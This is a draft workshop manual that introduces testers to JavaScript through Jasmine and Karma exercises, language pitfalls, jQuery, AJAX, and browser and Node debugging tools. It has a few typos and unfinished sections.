# Workshop overview
This manual serves as documentation for a practical workshop. It's a workshop
aimed at software testers who have some programming knowledge. If you don't know 
anything about programming, only certain parts of the training will bring you 
value. In that case you'll need to pair up with other colleagues during the 
workshop. Actually, we'll work in pairs most of the time. Former knowledge or 
experience with JavaScript is not required.
Even if you don't participate in the workshop this manual can still provide a guide
to start digging into the JavaScript world, as a tester. 

JavaScript is getting more a more popular and the number of applications based on
it is increasing fast. A good understanding of the language and the tools will be
effective to find out more ways to break applications down, catch defects.

## Conventions
The commands written in this manual begins with the dollar symbol ($) 
simulating the command line prompt. You don't have to type the dollar symbol. 
Some commands required you to be a super user. In those cases the prompt symbol
will be the hash (#). On some Linux systems like Ubuntu,
you can precede the command with the word "sudo" in order to execute it as such.

    # this is the prompt for a command executed as superuser.
    $ this is the prompt for a command executed as a regular user.

In JavaScript there are two ways to write comments. Comments are not interpreted,
they are left for humans to add annotations. The double slash affects only
one line:

    // this is a comment line, this line is not interpreted.

The slash with the asterisk is used to comment several lines:

    /*
     * this is a multi line comment 
     */

In this manual we use comments with dots in between to illustrate that in an
actual code, there would be some other lines of code in there but they are
irrelevant for the example at hand:

    /* ... */


# Configuring the project
There is an online project that accompanies this manual, containing source files and 
libraries. You can download it using [Mercurial](Version control tool) or by clicking 
the "Download" button on the project's site, which zips the folder: 

    https://bitbucket.org/carlosble/javascript4testers

## Setting up the tools for the workshop
JavaScript is already installed in all browsers, they are ready to execute it 
right away. We just need to start up the browser, open the console and write
JavaScript for the browser to interpret it on the fly.
In that regard, it's like BASIC back in the 80's on computers like 
Commodore or Atari where 
one could just start up the machine and code without any additional installation. 
However we are going to use frameworks and libraries 
that depend on [Node.js](http://nodejs.org/). You need to install Node.js which
comes along with the Node Package Manager (npm).
Node.js is a platform but most of the time we are going to use it just as a 
JavaScript interpreter in the command line. For now, you just have to know that
Node.js can interpret JavaScript without a browser. It's the technology used to
execute JavaScript in the backend/server side. Npm is a software installer that 
works in the command line. 

All the tools work on Windows, Linux, MacOS and other platforms. 

The project contains the Jasmine test framework already as well as libraries like 
jQuery. 

### Installing Karma
Karma is an open source test runner for JavaScript written mostly by Vojta Jina, 
a Google employee. It was named
Testacular at the beginning, aiming to illustrate that it is a spectacular 
test runner, but they changed the name for obvious reasons. We are
going to use Karma because it's really fast, it supports several test frameworks 
and can run on multiple browsers, even on mobile devices.
Karma is installed in the project's folder under the node_modules folder, however
it's recommended to install it globally. As a super user, run the following commands:

    # npm install -g karma
    # npm install karma-jasmine
    # npm install karma-chrome-launcher
    # npm install karma-coverage

Then start karma:

    $ karma start karma.conf

The karma.conf file exists in the project folder and it's been generated using 
the wizard that comes with karma ("karma init karma.conf"), you don't have to
worry about this file for now. After running this
line you should see some tests passing and some failing. It will also open up
a Chrome window to use the real browser as the execution environment, however
the test results are displayed in the console (command line).


# The JavaScript Language
A> "JavaScript, not to be confused with Java, was created in 10 days in May 1995 
A> by Brendan Eich, then working at Netscape and now of Mozilla. JavaScript was 
A> not always known as JavaScript: the original name was Mocha, a name chosen 
A> by Marc Andreessen, founder of Netscape. In September of 1995 the name was 
A> changed to LiveScript, then in December of the same year, upon receiving a 
A> trademark license from Sun, the name JavaScript was adopted. This was somewhat 
A> of a marketing move at the time, with Java being very popular around then." 
A> - A short [history](http://www.w3.org/community/webed/wiki/A_Short_History_of_JavaScript) of JavaScript

The key design principles within JavaScript were taken from the Self and Scheme
programming languages, whereas names and naming conventions were taken from Java.
Its principles along with the lack of built-in design constraints make it a 
multi-paradigm language that is extremely flexible and powerful. But at the same 
time, it can be really hard to learn and maintain if used wrong.

JavaScript went standard in June 1997 when Ecma International published the first
edition of the ECMA-262 specification. The standard JavaScript today is called
ECMAScript. Modern browsers support ECMAScript version 5. 

Native desktop applications provide better user experience than traditional
webs because they react
immediately to user input. However they are hard to deploy whereas the web
is easy to deploy. JavaScript brings the best of both worlds because apps are
deployed via browser but behave like desktop apps. The fact that modern browsers
support the ECMAScript standard is empowering developers to enhance user
experience again.

JavaScript is a programming language that don't even need the web browser to
be useful. In fact, Node.js provides JavaScript in the server side. 
Nevertheless browsers provide specific APIs for JavaScript to manipulate
HTML and CSS among other things. These APIs are the DOM (Document Object Model)
and the BOM (Browser Object Model). The DOM is used for the GUI. 
The W3C (World Wide Web Consortium) standardized the DOM and it's now supported
by all modern browsers. 

## Introduction to Jasmine
Jasmine is a third party tool, it's not part of the JavaScript language.
However, this is a practical workshop and one of the best ways to study JavaScript is by talking the language. We are going to use automated tests as a mean to 
execute JavaScript 
code and observe its behavior. The framework is going to be 
[Jasmine](http://pivotal.github.io/jasmine/), an open
source framework developed by Pivotal Labs the company behind Pivotal Tracker. 
A test project using Jasmine consist of the following files:

* The test runner/loader: it's an .html file
* The Jasmine files: jasmine.js and jasmine-html.js
* CSS files: jasmine.css
* The tests files: *spec.js

In order to run the tests we have to open the .html file in the browser 
(in case we don't use karma). This html is a local web page linking all 
the JavaScript files and containing the code that initializes and launches
the Jasmine test runner. It must contain also links to the production files
and any third party libraries used.

Our project folder contains a folder called "learnJavaScript" with the
file runner.html in it. Open the file with your favourite text editor to
how it looks like. To run the tests, open the file with the browser.
To learn JavaScript, we are not going to use a separate file for "production" code.
We are going to add all the code into the "spec.js" file.

### The specs structure
As you can see in spec.js, a test case is created with a *"describe"* block containing
tests inside, which are the *"it"* blocks. The first parameter passed
in to *"describe"* and *"it"* is a string that explain what is being tested. 
When a test fails, Jasmine shows both strings concatenated forming a sentence,
thus it's important to make sure that both strings together build up a meaningful
sentence. "Describe" blocks can be nested.

When there is duplication in the tests setup, we can extract it out using the
*"beforeEach"* function that Jasmine executes right before every test.

### Assertions
Jasmine comes with an *"expect"* function and several built-in matchers to make 
assertions:

    expect(actualVale).toBeGreaterThan(100);

Notice that a test without assertions is always a passing test (green), unless
there are a syntax errors or exceptions thrown in the executing code. The
assertions are a fundamental part of a test. This is why in Test Driven Development,
we run every new test before making it pass, to confirm it fails. Sometimes 
one makes mistakes in the test, and it's green when we expected it to be red.

A> The are several built-in matchers, find them listed in the framework's site.
A> Two useful matchers to assert on equality are:
A> 
A> * toBe: this is like using "===", only identical operands are equal.
A> * toEqual: this is similar to "==" but more powerful. It can compare objects, 
considering them equal if their properties have the same values.  

### Example
    describe("the calculator", function(){
        var calculator;
        beforeEach(function(){
            calculator = factory.calculator();
        });

        it("adds two numbers", function(){
            var result = calculator.add(2,2);
            
            expect(result).toEqual(4);
        });

        it("multiplies two numbers", function(){
            var result = calculator.multiply(3,2);

            expect(result).toEqual(6);
        });
    });

### Skipping tests
Sometimes you just want to run certain tests or maybe all the tests but one.
In Jasmine you can add an *"x"* before the *"describe"* or the *"it"* to 
tell the framework you want to skip those tests.

    xdescribe("...") // this skips all the tests within the test case.
    xit("...")       // this skips this particular test.

If you are using Karma to run the tests, there is also a way to ask Karma
to skip all the test but one. It works for test cases and single tests:

    ddescribe("...") // this executes only the tests within this test case.
    iit("...")       // this executes only this particular test, no more.


## Data types
JavaScript is a dynamic language, variables are defined dynamically and their
type is set based on the value assignment. 
The value types in JavaScript are 
**integers, strings, numbers, booleans, null and undefined**. 
The reference types are **arrays, functions and objects**. 

    var x;        // x is an undefined variable
    var x = null; // x is defined and its value is null
    var x = 7;    // x is an integer
    var objectLiteral = {property1: 'test', property2: 777}; // an object

See more information on data types [here](http://www.w3schools.com/js/js_datatypes.asp).

## Functions
Functions are the essence of JavaScript, they are first-class citizens in the
language. Functions can be passed in as arguments to other functions and they
can also return other functions.

    function theName(){var sample = 1;} // a named function
    function(){var sample = 1;} // an anonymous function

For a good introduction to functions see the beginning of the JavaScript 
Allongé 
[book](https://leanpub.com/javascript-allonge/read#leanpub-auto-as-little-as-possible-about-functions-but-no-less).

JavaScript functions can be 
[immediately-invoked](http://en.wikipedia.org/wiki/Immediately-invoked_function_expression)

    (function(){/*...*/}())

This is a very common pattern named IIFE (immediately-invoked function expression) 
used to produce lexical scopes as we will see later.

Functions can have nested functions:

    function (){
        /* ... */
        function(){ /*...*/ }
        /* ... */
    }

X>## Write your first function
X>
X> Inside the spec.js file, right on top of the first *"describe"* block,
X> create your first function. It should take two numbers and return the sum.
X> Test your function with an automated test.


### Objects
There are several ways to handle objects in JavaScript. The most simple way
is the "object literal" form:

    var anObjectInstance = {
          height: 100, 
          width: 100, 
          square: function(){return this.height * this.width;}
    };

Functions also create object instances when invoked with the "new" keyword:

    function SomeClass(height, width){
        this.height = height;
        this.width = width;

        this.square = function(){
          return this.height * this.width;
        }
    }

    var anObjectIstance = new SomeClass(100, 100);

X>## Create and test instance methods
X> Use these two forms of creating objects to create two instances in 
X> your tests. Then test the method in the instances. 

In JavaScript every object has a *"prototype"*. It's a pointer to another
object. When you try to access a property in an object and it's not found,
JavaScript will look for that property in its prototype. That prototype can
have in turn, another prototype. So JavaScript will follow the prototype
chain looking for the required property. This is another way of creating
methods in objects:
 
    function SomeObject(){
    }

    SomObject.prototype.someMethod = function(){
        return 7;
    }

    var someInstance = new SomeObject();
    someInstance.someMethod();      // returns 7;

There are several ways to create objects. This is a common one in ECMAScript 5:

    var someInstance = Object.create(null);
    defineProperty(someInstance, "someMethod", function(){ return 7;});
    someInstance.someMethod();      // returns 7;

    var someOtherInstance = Object.create({someMethod: function(){return 7;}});
    someOtherInstance.someMethod(); // returns 7;

As you can imagine, there are several ways of implementing inheritance but that
is out of the scope of this workshop, at least for now.

## JavaScript: The tricky parts
There are behaviors in the language that are totally unexpected for beginners.
Let's have a look at this characteristics with a practical approach, using 
automated tests to exercise them.

### The "strict" mode
To avoid some of the "tricky" behaviors of JavaScript, ECMAScript 5 implements
the "strict" mode that turns mistakes into errors/exceptions. To enable
the strict mode add the following line at the beginning of your namespaces
declarations (global functions): 

    "use strict";

Unfortunately, the strict mode is not well supported by all browsers, this is
why we still have to be aware of the common mistakes programmers make.

A> "Browsers don't reliably implement strict mode yet, so don't blindly depend on 
A> it. Strict mode changes semantics. Relying on those changes will cause 
A> mistakes and errors in browsers which don't implement strict mode. 
A> Exercise caution in using strict mode, and back up reliance on strict mode 
A> with feature tests that check whether relevant parts of strict mode are 
A> implemented. Finally, make sure to test your code in browsers that do and 
A> don't support strict mode. If you test only in browsers that don't 
A> support strict mode, you're very likely to have problems in browsers 
A> that do, and vice versa." - From Mozilla developer network


### Coercions
In JavaScript, not only booleans evaluate to true or false. Number zero or the
empty string also evaluate as false whereas non-zero numbers and non-empty 
strings evaluate to true. This is why we talk about "truthy" or "falsy" values.
Both, undefined and null evaluate to false.

There are two operators to ask for equality (and their counters, inequaliaty). 
The double equal and the triple equal.
Double equal returns true if both operands are truthy or falsy. On the other
hand, triple equals returns true only if both operands are exactly the same thing.
In other languages, operators like the double equal or the arithmetic operators
fail when applied to operands of different types. For example if I try to compare
a string with a number. However in JavaScript, it compares the values, coercing
them in ways that might look strange. Examples:

    1 == "1"; // true
    1 === "1"; // false
    true == 1; // true
    true == 2; // false
    null == undefined; // true
    NaN == NaN; // false

This [post](http://webreflection.blogspot.com.es/2010/10/javascript-coercion-demystified.html) explains how coercions work.

X>## Test the coercions
X>
X> Write a unit test for all the comparisons you can think of.
X> See the tests pass or fail with Karma and also in the browser with Jasmine runner.


### Global variables
When a variable is used without the "var" keyword, it lives in the "global" 
environment. In the browser, the global environment is the "window" object:

    x = 5; // global: equivalent to window.x = 5 in the browser

In node, the global environment is called just global:

    x = 5; // global: equivalent to global.x in Node

A> Always declare variables with the "var" keyword, do not use globals.

The problem with globals is that they can easily collide among them,
causing wrong behaviors, that are hard to find and correct. Not only with
our own code but also with the third party libraries we might be using.

X>## Write a test that creates a global variable
X>
X> Then create another test to see the variable is still there, 
X> potentially causing side effects (unit tests should not interfere with
X> each other). 

### Undefined
Undefined is a value and it shouldn't be writable. It's not writable 
from  ECMAScript 5 on, but not all browsers implement this constraint.
If for some reason, the "undefined" value is overwritten, it will cause
defects in all the code that relies on undefined.

    undefined = 100; // now the global value undefined is no longer undefined

    if (someValue === undefined) // now it will fail even if someValue is undefined.

Fortunately there is an alternative way to check for undefined values:

    if (someValue === void 0) // this works always.

A popular pattern used in jQuery to avoid overwriting the "undefined" is this:

    var namespace = namespace || {};
    (function(namespace, undefined){

        namespace.SomeClass = function(){
           /* ... */
        }/

    }(namespace));

D>## What's the meaning of the code block above?
D> 
D> Why is it avoiding possible problems with "undefined"?
D> Write some tests for it and the discuss with others.


### The "this" and "new" keywords
Let's review again the previous code but now, let's introduce a tiny change.

   function SomeClass(height, width){
        this.height = height;
        this.width = width;

        this.square = function(){
          return this.height * this.width;
        }
    }

    var anObjectIstance = SomeClass(100, 100);

X>## What's going on?
X> Can you notice what the change is? Copy this code and paste it into the 
X> spec.js file
X> in order to add tests for it. Can you explain what is going on?

The "this" keyword in JavaScript does not work exactly as it does in other
languages like Java. Here, it is dependent on the context.
On the other hand, the "new" keyword is the one which convert plain functions
into constructors. There are several patterns to avoid problems when the 
consumer forgets the "new" keyword. 

There are ways to write JavaScript without the need for the "this" and the "new"
keywords. In the book "JavaScript: the Good Parts", Douglas Crockford explains
a pattern called functional inheritance that can be used to define classes:

    function someClass(){
        var self = {};

        self.someMethod = function(){
            return 777;
        };

        return self;
    }

    var someObjectInstance = someClass();

X>## Find more patterns
X> There is another patter to make the code work even when the
X> "new" keyword is forgotten. Search the Internet for a little while
X> and write a test for it. Hint: try to the keys "enforcing new" to your search.

### Frames
Each frame's got its own global environment and there are problems with the
"instanceof" operator when and iframe sends data to a function in the parent 
window. See the details in this [presentation](https://speakerdeck.com/rauschma/categorizing-values-typeof-instanceof-and-beyond) by Axel Rauchsmayer.

One way to avoid problems in the communication between frames, is by passing high 
level messages between them, using 
the [window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window.postMessage) API.

### Closures and Scope
Every function creates an environment. Variables declared inside that environment
are local to it, not visible from the outside. The scope of a local variable inside
a function, is the function itself and all the nested functions it might contain. 

    var someGlobal = 100;

    function outerScope(){
        var x = 1;

        function innerScope(){
            var y = 2;

            return x + y;
        };

        return innerScope();
    }

    outerScope(); // What is this returning?

The variable "someGlobal" is visible everywhere. The variable "x" is visible
inside the "outerScope" and "innerScope" functions. The variable "y" is only
visible within the "innerScope" function. Variable "x" is a free variable
inside the "innerScope" function because it hasn't been defined inside or passed in
as an argument. "outerScope" is a pure function whereas "innerScope" is a closure.

A> Functions containing free variables are called *"closures"*

X>## Write assertions for the tests
X>
X> In learningJavaScript/spec.js there is a test case 
X> (*"describe when using functions"*)
X> to practice with scopes and closures. Some of its tests are incomplete, 
X> they miss assertions. Well, the assertions are commented and incomplete.
X> Uncomment the assertions and complete them making tests pass.
X> Some other tests have assertions but they are failing because there are
X> defects in the code. For those cases, fix the defects without changing
X> the assertions.
X> 
X> Note: pay attention to the error messages displayed by test runner
X> when tests fail and pass.


### Advanced exercises
A> A Koan is a paradox to be mediated upon that is used to train Zen Buddhist monks
A> to abandon ultimate dependence on reason and to force them into gaining sudden
A> intuitive enlightment - Dictionary entry for Koan

The koan metaphor has been borrowed in programming referring to an 
exercise that
consist in making broken tests pass, as a mean to learn a new programming language. 
You can find "koans" for many programming languages. The Ruby 
[ones](http://rubykoans.com/) are quite popular.

This is actually what we have been doing in previous exercises. We leave you now with
more "koans" to dig dipper into the JavaScript language:

X>## Koans
X>
X> The tests in this 
X> [link](https://bitbucket.org/carlosble/bddjsworkshop/src/979268a501efa5bf37def13bef812bcfc5d51d85/introSpec/introductionSpec.js?at=default)
X> do not pass, because the assertions are wrong. 
X> Just by reading the tests, would you know what are the right assertions 
X> for each test?



## Common sources of defects
In a traditional web, every user action (event) is processed in the 
server side which sends back a refreshed page that is rendered in
the browser. As every request refreshes the page, its controls (widgets: buttons, labels...)
are reset. It's like restarting the GUI. 
On the other hand, rich JavaScript applications process the events
in the browser without page reloads. The code in the browser sends
and receive mostly data from the server. Well, sometimes
certain chunks of the GUI are loaded from the server via JavaScript
but is not the whole page. Now the controls maintain state
and they have to be cleaned up explicitly. 

Imagine a list of items that you can click. When an item is clicked
the application pops up a modal dialog displaying detailed 
information about the selected item. Let's say the dialog contains
three text boxes to display three item's properties. Then the user 
closes the dialog and selects another item, bringing the dialog 
back to the front. If programmers didn't clean up the text 
boxes within the dialog, it might display data from the old item
mixed up with the last item selected.

For this reason, it's worth repeating operations when exploring
the application seeking for defects. Certain operations may work
well for the first time but fail on consecutive trials.

Transient data may be another source of trouble. JavaScript 
applications may cache data in the browser, be it in memory or 
in the [local storage](local storage). Data is cached to enhance
user experience. The problem may arise when other users are changing
the same data at the same time. If that happens, the local data
stored in one user's browser is outdated compared with the data
that another user has sent to the server. Developers have to 
code and architect the application to resolve these situations. 

Network failures can represent yet another source of trouble.
If the network fails for a little while and the application tries
to send data to the server, that data might be lost, unless the
programmers take care of that particular case. So when you explore
the application in search of defects try to switch off the 
network connection from time to time to see how the application
works around this temporary failure.

The lack of support for web standards in the browsers has been a 
typical source of 
problems in the past decade. It still is if you have to support old
browsers. Testing applications in several browsers is important,
specially if the code is written with vanilla JavaScript accessing the DOM
rather than using libraries like jQuery. jQuery and other libraries have made
a brilliant job creating an abstraction layer that prevent us from writing
code that works on some browsers and breaks the application on others.


TODO: add more information into this section

## JSON
JSON is the string representation of a JavaScript object literal (a serialized object). 
This is an object literal:

    {name: 'Bob', surname: 'Wayne'}

This is its JSON representation:

    '{"name":"Bob","surname":"Wayne"}'

As you can see they are very similar but not the same. JSON is not
valid JavaScript, it's just a string. To convert JSON to/from 
JavaScript, there is a built-in utility implemented by all modern
browsers: 

    var theObject = JSON.parse(theJSONstring); // JSON to JS
    var string = JSON.stringify(theJSobject);  // JS to JSON

JSON is mostly used to exchange data between the browser and the 
server side as well as to write configuration files.

# Browser development tools

From now we are going to use the browser intensively in the exercises. Right now
the browser that comes with more built-in development tools is Google Chrome.
Although these tools are named "developer tools", one of their main purposes is 
testing. 

Open up Google Chrome and visit www.google.com. Now find the browser menu, usually
located in the top right corner. Find the "tools" item in the menu and the 
"Developer tools" option [within](On Linux you can use the shortcut Crtl+Shift+I).
Yet another way to open Developer tools is by right-clicking any item in the page
and selecting the option "Inspect Element" from the menu.
It appears at the bottom of the page displaying the following tabs:

* Elements: to inspect HTML and CSS as well as manipulate them on the fly.
* Resources: to access files (images, JavaScript files...), cached data, cookies...
* Network: to monitor all incoming and outgoing communications.
* Sources: to inspect, modify and debug JavaScript files.
* Timeline: to monitor the application, watching resources consumed along the time line
* Profiles: for profiling purposes.
* Audits: Tips on what can be optimized in the site.
* Console: Displays error messages as well as JavaScript messages sent with the 
"console.log" function. The console let us write JavaScript to interpret it on 
the fly. 

For testing and debugging purposes, the tabs we are going to use the most 
are: Elements, Sources and Console.

In the case of Firefox, it does bring development tools but the [Firebug](Firebug)
extension is what most people use because it's got more utilities. Firebug is 
similar to Chrome Developer Tools, in fact, it came first. The equivalent tabs 
for testing and debugging are: HTML, Script and Console.

A> If you haven't Firebug installed yet, please install it at this point.
A> You can remove it after the workshop if you want.



# The DOM (Document Object Model)
A> "The HTML DOM defines a standard way for accessing and manipulating HTML documents.
A> The DOM presents an HTML document as a tree-structure." - From w3schools.com

A> "As a W3C specification, one important objective for the Document Object Model 
A> is to provide a standard programming interface that can be used in a wide 
A> variety of environments and applications. The DOM is designed to be used with 
A> any programming language." - From the W3C

Although the DOM goes beyond JavaScript, we'll refer to the DOM as its JavaScript
binding, the API to manipulate HTML with JavaScript. The DOM API is present only
in the browser. For Node.js there are fake implementations for testing purposes.

    document.getElementById("c6").name; // reading the attribute "name" of a node.

The "document" is a property that belongs in the global "window" object in 
the browser.

Unfortunately the DOM API is not exactly the same in all browsers, although 
modern browsers are following the standard now but it wasn't like that in the
past decade. You could write a piece of code that worked on Firefox but
didn't work on Internet Explorer or the other way around. 
For this reason the open source community came up with libraries that wrap up
the DOM API offering a new API that works on all major browsers. 
This is part of the reason why libraries like jQuery got so popular, in addition
to its brilliant API and robust behavior.

X>## Let's go to the browser
X>
X> Open up the browser and go to your favourite site. 
X> With the right mouse button inspect elements to find the id of text element.
X> Then open the console and try to change the text using JavaScript with
X> the DOM API



# jQuery basics
jQuery is a library. You need to include the jquery.js file into your site in order
to have it available. jQuery exposes its API through the global dollar 
symbol ($).

    $('#someId').html(); // reads the html as a string of the element with id someId

The "dash" symbol means an id, whereas the "dot" symbol means a class:

    $('.blue'); // refers to all the elements with a blue class attribute

We can also select all the items of a type:

    $('button').hide(); // hides all button elements in the page.

As you can see, jQuery offers a simple API to select DOM elements and read or
set properties on them, as well as managing events caused by the user or the
browser.

    $('document').ready(function(){console.log('page is now loaded')});

The line above is an event handler that executes once the whole page is loaded,
including all its images and JavaScript files. The truth is that jQuery 
contains a lot more utilities than that but for the purpose of this training
that is all we need to know.

X>## Let's use jQuery on the fly
X>
X> Go to jquery.com. It includes the jQuery library so you can use it straight away.
X> Then open the browser's console.
X> Type in the JavaScript necessary to hide the page's logo and some images.

## Selectors
jQuery is really powerful when it comes to select elements in the DOM. Have a look
at the learning 
[section](http://learn.jquery.com/using-jquery-core/selecting-elements/) 
in the jQuery site. Work out the examples in the page using the console.

## Ajax
jQuery provides a nice API to use AJAX. AJAX is the most common way to send
and receive data from the server (encoded as JSON). It is also used to bring
parts of the GUI dynamically from the server (HTML, CSS or images). 

    $.ajax(') // put an example here.

One of the "A" in AJAX stand for asynchronous which means the browser is not
blocked while the server processes the request. In order for the browser to
be notified when the response arrives, AJAX uses a "callback" function. The
data is passed in to that function and it's in there when we get the flow control
back to react upon this obtained message.

The functions $.get and $.post are aliases to the $.ajax function with certain
settings configured.

    $.get('/some/url', function(data){ console.log(data); }); // HTTP GET
    $.post('/some/url', {someData: 123}); // HTTP POST

The HTTP GET command is used to request information from the server, whereas
POST, PUT and DELETE are used to send and modify information.

X>## Make some calls
X>
X> Go to jquery.com. Open up the browser console and execute this line:
X>               $.get('/', function(data){ console.log(data)});
X> Do you understand what is it doing?


# Debugging Applications
The debugger allows us to pause the execution of the code at certain points and
inspect the values of the variables within that scope and the call stack that
precedes the current point. These marks where the code is paused are called
*"breakpoints"*. Once it's paused, we can go off executing and pausing the code 
line by line,
watching how the state and the flow change to figure out why it reaches to
a certain point. When the line is a function call, we can step over it, or
step in. When we are inside a function, we can set out of it to the point
where the flow continues.
Developer tools also give us the option to pause the code
whenever an [exception](an unexpected error stopping the regular flow) is raised,
behaving like a breakpoint. 
We debug basically to understand the behavior of the application upon a particular
circumstance aiming to spot a solution.

From a testing perspective, when we haven't wrote the code but need to debug it,
the first question is, where do we start debugging?

The first thing is understanding the structure of the application:

* Is there a main separate JavaScript file containing all the application?
* Is the JavaScript embedded in a main HTML file?
* How many JavaScript files are there, which ones are related to this behavior?
* Is the JavaScript minified?
* Is it relying on a particular framework like Angular, Backbone, Ember, ...?

The best choice is asking developers in the team. Pairing with developers to
review and understand the code is often the most productive approach. Debugging
is the last alternative for an agile team to find out defects. Before 
doing so, the pair would review the automated tests regarding the particular
dysfunctional feature and the source code. Either the tests or the production
code will tell us what is wrong as long as it's well written. Once the problem 
is found,
the pair would write a failing test pointing it out to later 
fix it and see the test pass. 

In case we can't pair up with a developer or there are no enough automated tests,
or the code is just hard to understand then we roll up our sleeves and go ahead
debugging.

Some of the questions in the list above can be answered by looking at the page 
source in the browser (Ctrl + U in various browsers). The JavaScript libraries
and frameworks use to be included at the beginning or the bottom of the page.
We can quickly see if jQuery or other libraries are being loaded. With 
the developer tools in the browser we can also have a look at the JavaScript files
loaded.

If we are debugging an unexpected exception, the shortest path is asking 
Developer tools to pause on any exception. We would freeze the execution at that
point to observe the state of the system at the call stack. The call stack is 
the sequence of function calls that have been made until reaching the current point.
They usually start with an event triggered by the user interaction, the browser 
itself or a callback from the server side.
Even without configuring Developer Tools to stop on an exceptions, they
are displayed in the console with a link to the exact line of code that
raised it. We can just follow the link and add a breakpoint there.

It we are looking for an unexpected behavior not throwing an exception, we might need
to set up some breakpoints. If the behavior is triggered by user interaction,
we must search for event names in the code. If it's a "click" event we can 
start off searching for the word "event" in the code. To search for text in
the source code, click on it and press Ctrl + F to show
the search box. Then type in "click". Add breakpoints in all the suspicious
lines. Notice that source code listings have the line number at the left hand side. 
To add a breakpoint click on the line number. To remove a breakpoint click on it.
Once breakpoints are set, repeat the action and hopefully the execution will
be paused on one of them.

In the next sections we'll explore additional features in Firebug and Chrome that
ease debugging even more.

## Watching Expressions

A> This subsection is pending... sorry

## The Call Stack

A> This subsection is pending... sorry

X>## Debug The Game
X> 
X> In the project folder there is a folder called testTheGame. It contains
X> a tiny game that we are going to explore, test and debug. 
X> It's a client-server game with multi-player support. 
X> Run the server and open the browser to explore the sources.
X> Try to figure out the point where the "score" is updated in the screen
X> using a breakpoint.


## Debugging with Firebug
Let's have a look at Firebug's specific debugging features.

A powerful feature in Firebug is the text search in the source files. When you
go to the "Script" tab and press Ctrl + F, Firebug let you choose whether you
want to search in a particular file or in all the files loaded by the page 
(the "Multiple Files" option). 
This is very useful when there are too many files loaded and it's hard to 
know which one contains the code we are interested in. 

Another useful feature is the "Break On Next" feature. It's a small toggle 
button at the left hand side with a pause symbol and a smaller play symbol on it.
When enabled, Firebug will pause execution right away. So we can enable it, and
then click a button for example. Firebug will pause the execution in the event
handler code. This may be the shortest path when the behavior under test is 
triggered by user interaction.

Similar to "Break on Next" is the "Break On All Errors". But this one is in 
the "Console" tab, not in the "Script" one. It's exactly in the same position.
When enabled, Firebug will pause the execution as an exception is thrown, like
a breakpoint.


## Debugging with Chrome Dev Tools 
Let's have a look at Chrome's specific debugging features.

If the code is minified, Google Chrome has a "Pretty print" option that makes
it read better. This option is enabled by clicking the button with curly
braces at the bottom ({}). The button appears when a JavaScript file is opened.

Right besides the "Pretty print" button it's the "Pause on all the exceptions" 
button. This button's got three states. It can be disabled, enabled for all 
the exceptions or enabled only for uncaught exceptions. When enabled, it will 
freeze the execution as the exception is thrown letting us observe the context.

On the right hand side, beside the code, Chrome displays the "Watch Expressions", 
"Call Stack", "Scope Variables", "Breakpoints" and more. There are different
kind of breakpoints:

* If you want to pause the execution on any an AJAX request, go to deploy the 
XHR Breakpoints option and select "Any XHR". This is a fast way to inspect
code making requests to the server. Once the code is paused there, you can
have a look at the Call Stack to find out what code path leads to the AJAX
request.

* If you want to pause the execution on any "button click" for example,
deploy the "Event Listener Breakpoints" item, the deploy "Mouse" and select
"click".

For more information see the official [documentation](https://developers.google.com/chrome-developer-tools/).

## Debugging on IE
Internet Explorer 8 and later comes with Developer tools too, although they are
limited compared with Firefox and Chrome. Find the Microsoft documentation 
and tutorials [here](http://msdn.microsoft.com/en-us/library/dd565628(v=vs.85).aspx).

Fortunately Firebug (Firebug little actually) can also be used on IE. Firebuglittle 
works on IE6+ versions and provide a subset of Firebug's functionality. 
There are several ways to debug with Firebug little.

The first one is including the library in the source code of your page. 

    <script type="text/javascript" src="https://getfirebug.com/firebug-lite.js">
    </script>

The second
is using bookmarks. See a screencast on how to do it [here](http://www.youtube.com/watch?v=vLJ2RaNZ22E).


## Debugging JavaScript in the server
Node.js comes with a built-in debugger. All we need to start up the debugger is:

    $ node --debug path/to/the/javascript/file.js

In order the use a GUI for debugging, we can use the node-inspector:

    # node install -g node-inspector
    $ node-inspector &

Now just open the browser pointing at http://127.0.0.1:8080/debug?port=5858
Node inspector uses Google Chrome Dev Tools as the GUI.

# Online tools
There are several online sites providing functionality to debug, inspect, 
try and compress JavaScript code among other things:

* [JSFiddle](http://jsfiddle.net/): Try HTML, CSS and JS on the fly together
with a wide range of JS libraries.

* [JSBin](http://jsbin.com/): Similar to JSFiddle but with online collaboration 
features.

* [JSBeautifier](http://jsbeautifier.org/): Paste your minified 
JavaScript to make it readable.

* [JSON Pretty Print](http://jsonprettyprint.com/): Paste your JSON and
get it formatted in a human readable style.
  
* [JS Compress](http://jscompress.com/): Compress/Minify code

* [JSMini](http://jsmini.com/): Compress/Minify code

* [JS Hint](http://www.jshint.com/): The online version of JSHint to detect
errors and potential problems in your code

* [JS Line](http://www.jslint.com/): The online version of JSLint to detect
errors and potential problems in your code

* [RegexPal](http://regexpal.com/): A regular expression tester


# Integration Testing utilities
There are different types of integration tests depending on their granularity.
End-to-end tests are coarse-grained covering pretty much all the layers
in the application. But they are expensive and hard to maintain because they
can break for several reasons. If there are no additional unit tests or 
fine-grained integration tests failing at the same time that the end-to-end
test, we'll have to debug it. And debugging is something we must avoid
because it's time consuming and really hard to estimate for how long we'll
be doing so.
The finer the tests are, the easier it is to find out why they
are broken but at the same time they cover less functionality. 

In the following sections we are going to review several tools to create
different types of integration tests, using our "Test The Game" application
as an example.
In addition we are going to use [LiveTeamApp](http://www.liveteamapp.com)
to practice how to test complex rich applications. LiveTeamApp is a real
time tool for teams to be aware of each others availability, 
[pomodoros](http://pomodorotechnique.com/) and
to keep track of time spent on tasks. The chat is synchronized with the 
pomodoro and the task everyone is working on is displayed to others, together
with the time left for the person to finish off the pomodoro.


## Selenium
Selenium is a powerful testing library for web pages/applications. It let us 
interact with
the GUI programmatically and it's very intuitive. It's used for automated tests 
that access the application through the UI. 

![Selenium IDE](images/selenium_ide.png) 

[Selenium IDE](http://jsmini.com/) is a plugin for Firefox that allows us to write 
and execute automated tests without writing code, by recording the way we use 
the page/application. 
Recorded tests may be useful as a starting point to create tests from scratch 
faster. Then it can generate the equivalent test in code,  in a wide variety of 
programming languages in order for them to be maintained by developers and testers 
using tools like version control systems. As a first approach to automated tests,
Selenium IDE is very convenient.

X>## Test The Game with Selenium IDE
X>
X> Install Selenium IDE on your Firefox. Open up our
X> game page and start up Selenium IDE.
X> Switch on the record mode and play a game, scoring
X> 5 points.
X> Stop the record mode.
X> Write all the necessary assertions to make sure the
X> score is always present in the screen and run the test
X> to see it pass. 
X> Generate and read the Java code for the test (with JUnit 4).

